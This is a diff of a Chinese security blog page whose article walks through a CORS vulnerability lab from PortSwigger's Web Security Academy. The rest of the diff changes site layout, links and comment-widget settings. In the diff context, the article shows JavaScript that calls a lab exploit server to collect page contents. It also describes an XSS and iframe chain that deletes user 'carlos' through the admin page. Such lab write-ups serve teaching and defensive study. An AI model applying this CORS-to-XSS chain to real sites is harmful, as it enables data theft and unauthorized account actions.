 <span class="token function">fetchUrl</span><span class="token punctuation">(</span><span class="token string">"http://192.168.0.175:8080"</span><span class="token punctuation">,</span> <span class="token string">"http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512094430574.png" alt="image-20230512094430574"></p>
+<p><img src="image-20230512094430574.png" alt="image-20230512094430574"></p>
 <p>Collaborator交互或利用服务器日志会提供管理页面的源代码</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512094539843.png" alt="image-20230512094539843"></p>
+<p><img src="image-20230512094539843.png" alt="image-20230512094539843"></p>
 <p>part4：</p>
 <p>检索源代码，会注意到有一个允许删除用户的表单。重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为相同的IP地址和端口号。</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//  源代码</span>
@@ -1301,9 +1306,9 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
 8.调用 fetchUrl 函数，传递目标 URL 作为参数，以发起异步请求并触发 XSS 攻击。
 
 这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512094948032.png" alt="image-20230512094948032"></p>
+<p><img src="image-20230512094948032.png" alt="image-20230512094948032"></p>
 <p>代码通过注入一个指向/admin页面的iframe提交表单以删除carlos</p>
-<p><img src="/2023/07/26/cors-kua-yu-lou-dong/image-20230512095046927.png" alt="image-20230512095046927"></p>
+<p><img src="image-20230512095046927.png" alt="image-20230512095046927"></p>
 <p>详情参考: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/128696923?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_53079406/article/details/128696923?spm=1001.2014.3001.5502</a></p>
 
                 
@@ -1395,7 +1400,7 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -1403,7 +1408,7 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -1683,12 +1688,12 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1817,6 +1822,8 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1844,8 +1851,8 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1928,8 +1935,6 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1949,24 +1954,28 @@ Origin:http://subdomain.0a9800610460650c822b3861005c0050.web-security-academy.ne
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -2178,8 +2187,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
